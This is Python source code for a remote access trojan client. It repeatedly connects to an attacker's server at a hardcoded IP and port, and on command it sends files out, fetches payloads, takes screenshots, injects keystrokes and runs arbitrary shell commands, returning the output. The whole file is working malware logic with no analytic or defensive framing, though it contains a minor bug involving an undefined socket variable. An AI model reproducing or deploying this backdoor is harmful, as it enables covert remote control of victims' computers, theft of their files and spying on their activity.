import os
import sys
import time
import socket
import subprocess
import platform
import base64
import urllib2
import argparse
import ImageGrab
from Crypto.Cipher import AES
from classes import Server
from modules.downHTTP import downHTTP
from modules.execShell import execShell
from modules.screenshot import screenshot
from modules.vbs import buildVBS, runVBS, sendKeys, activApp

server = Server('192.168.2.164', port=1337)
while True:
    time.sleep(1)
    # connect to the server / attacker
    server.connect()
    # receive activation command
    data = server.receive()
    if data == 'Activate':
        active = True
        server.send(' -- OS : ' + platform.system() + ' ' + platform.release() +
                    '  --  Build : ' + platform.version() + ' --\n')
        while active:
            # receive command from server
            data = server.receive()
            if data == 'quit' or data == 'exit':
                # user quitted
                server.send('quitted')
                active = False
            elif data == 'get current dir':
                # send current path
                server.send(os.getcwd())
            # change directory
            elif data.startswith('cd '):
                cmd = data.split(' ')[1]
                try:
                    os.chdir(cmd)
                    server.send('')
                except:
                    # error by changing the directory
                    server.send("Unable to enter the directory '" + cmd)
            elif data.startswith('encryption '):
                # encryption settings
                if data.split(' ')[1] == 'on':
                    server.encryption = True
                elif data.split(' ')[1] == 'off':
                    server.encryption = False
            elif data.startswith('download '):
                # upload a file to the server
                server.upload(os.path.abspath(data.split(' ')[1]))
            elif data.startswith('downHTTP '):
                # download file from web
                if len(data.split(' ')) == 2:
                    downHTTP(server, data.split(' ')[1])
                elif len(data.split(' ')) == 3:
                    downHTTP(server, data.split(' ')[1], data.split(' ')[2])
            elif data.startswith('upload '):
                # download a file from server / attacker
                server.download(data.split()[1])
            elif data.startswith('screenshot'):
                # take a screenshot
                screenshot(server)
            elif data.startswith('sendKeys ') or data.startswith('sendkeys '):
                # execute keystrokes
                sendKeys(data.split(' ')[1])
                server.send('Executed Keys.\n')
            elif data.startswith('activateApp ') or data.startswith('activateapp '):
                # bring a running program in the foreground
                activApp(data.split(' ')[1])
                server.send('Activated ' + data.split(' ')[1] + '.\n')
            elif data != '':
                # run the command in the shell and send output
                server.send(execShell(data))
        time.sleep(1)
        s.close()
        # timeout to reconnect
        time.sleep(10)
s.close()